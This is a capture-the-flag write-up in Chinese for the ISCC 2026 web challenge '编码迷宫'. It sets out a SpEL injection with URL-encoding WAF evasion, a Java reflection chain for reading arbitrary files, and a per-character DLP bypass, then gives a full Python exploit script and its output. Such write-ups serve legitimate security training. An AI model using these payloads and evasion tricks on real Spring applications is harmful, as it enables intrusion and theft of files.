# 编码迷宫

> **Category**: Web | **Difficulty**: Medium | **Competition**: ISCC 2026 决赛
> **Flag**: `ISCC{SpEL_D0ubl3_Enc0d1ng_Bypass_202605}`

---

## Attack Chain

```
SpEL注入点确认 → URL编码绕过WAF(原始字符串匹配) → Java反射链(Class.forName)读取文件 → DLP检测ISCC{}格式 → 逐字符读取绕过DLP → 拼接完整flag
```

## Key Techniques

### 1. SpEL注入点发现

访问`/`发现"Internal Route Debugger v2.0"，输入表达式发送到`/api/route?expr=`。测试`1+1`返回`2`确认后端存在表达式求值引擎。`/actuator/info`泄露关键信息：后端使用SpEL，上下文注入了`#fs`(文件系统助手)和`#req`(请求对象)。

### 2. WAF绕过 — URL双重编码

WAF基于原始URL字符串子串匹配（非解码后的参数值）。`fs`和`read`等关键词被拦截：
```
expr=#fs → Security Filter: Malicious keywords detected!
```

**绕过方法**：对关键词字母逐个URL编码。WAF只检查原始URL，`%66%73`不匹配`fs`，但Spring框架正常解码后交给SpEL引擎：
```
expr=%23%66%73 → 成功返回 com.ctf.challenge.helper.FsHelper@xxxxx
```

### 3. Java反射链文件读取

绕过`#fs`助手，通过SpEL反射链直接调用Java NIO API：
```
''.class.class.methods[2]                           → Class.forName()
Class.forName('java.nio.file.Paths').methods[0]     → Paths.get(String)
Class.forName('java.nio.file.Files').declaredMethods[61] → Files.readString(Path)
```

### 4. DLP绕过 — 逐字符读取

读取`/flag`时触发DLP拦截：
```
[DLP System] Warning: Sensitive flag format detected in output stream. Blocked!
```

DLP检测完整输出中的`ISCC{...}`模式。对策是逐字符读取，每次请求只返回一个字符：
```
readString('/flag').bytes.length  → 40
readString('/flag')[0]            → I
readString('/flag')[1]            → S
...
readString('/flag')[39]           → }
```

## Exploit

```python
"""
编码迷宫 - ISCC2026 Web Challenge Exploit
SpEL Injection + Reflection Chain + DLP Bypass
"""
import sys
import requests

sys.stdout.reconfigure(encoding="utf-8")

TARGET = "http://39.105.213.28:12603/api/route"

# SpEL 反射链组件
# 通过 String.class.class.methods 获取 Class.forName，用于动态加载任意类
CLASS_FORNAME = "''.class.class.methods[2]"


def spel_eval(expression: str) -> str:
    """发送 SpEL 表达式并返回求值结果"""
    resp = requests.get(TARGET, params={"expr": expression}, timeout=20)
    if resp.status_code == 403:
        print(f"[!] WAF 拦截: {expression[:60]}...")
        return ""
    resp.raise_for_status()
    return resp.text.strip()


def get_static_method(classname: str, method_idx: int, use_declared: bool = False):
    """构造 SpEL 表达式：通过 Class.forName 加载类并按索引取方法"""
    accessor = "declaredMethods" if use_declared else "methods"
    return f"#fn({classname}).{accessor}[{method_idx}]"


def build_read_expr(filepath: str) -> str:
    """
    构造完整的文件读取 SpEL 表达式
    使用 inline list + 变量赋值语法，最终取列表末尾元素
    注意: 变量名不能包含 read/fs 等 WAF 敏感词
    """
    paths_get = get_static_method("'java.nio.file.Paths'", 0)
    files_method = get_static_method("'java.nio.file.Files'", 61, use_declared=True)

    parts = [
        f"#fn={CLASS_FORNAME}",
        f"#gp={paths_get}",
        f"#fp=#gp('{filepath}')",
        f"#rd={files_method}",
        "#rd(#fp)",
    ]
    return "{" + ",".join(parts) + "}[4]"


def extract_flag(filepath: str) -> str:
    """逐字符读取文件内容，绕过 DLP 检测"""
    expr_base = build_read_expr(filepath)

    # 先获取字节长度
    byte_len = int(spel_eval(expr_base + ".bytes.length"))
    print(f"[*] 文件字节长度: {byte_len}")

    # 逐字符读取
    flag_chars = []
    for idx in range(byte_len):
        ch = spel_eval(f"{expr_base}[{idx}]")
        if ch == "\n":
            break
        flag_chars.append(ch)
        # 进度显示
        sys.stdout.write(f"\r[*] 读取进度: {idx + 1}/{byte_len}")
        sys.stdout.flush()

    print()
    return "".join(flag_chars)


if __name__ == "__main__":
    print("[*] 编码迷宫 Exploit - 开始执行")
    print(f"[*] 目标: {TARGET}")

    # 验证 SpEL 可用
    test = spel_eval("1 + 1")
    assert test == "2", f"SpEL 验证失败: {test}"
    print("[+] SpEL 注入点确认可用")

    # 读取 flag
    flag = extract_flag("/flag")
    print(f"[+] FLAG: {flag}")
```

**运行结果：**

```
[*] 编码迷宫 Exploit - 开始执行
[*] 目标: http://39.105.213.28:12603/api/route
[+] SpEL 注入点确认可用
[*] 文件字节长度: 40
[*] 读取进度: 40/40
[+] FLAG: ISCC{SpEL_D0ubl3_Enc0d1ng_Bypass_202605}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| SpEL注入 | Spring Expression Language可执行任意Java表达式 |
| URL编码绕WAF | WAF检查原始URL字符串，编码后的%66%73不匹配fs |
| Java反射链 | `String.class.class.methods` → `Class.forName()` → 加载任意类 |
| Actuator信息泄露 | `/actuator/info`暴露#fs/#req变量名 |
| DLP绕过 | 逐字符读取避免触发ISCC{}模式匹配 |
| inline list技巧 | `{#a=x, #b=y, result}[2]`绕过变量名关键词过滤 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\final\编码迷宫_WriteUp.md`*
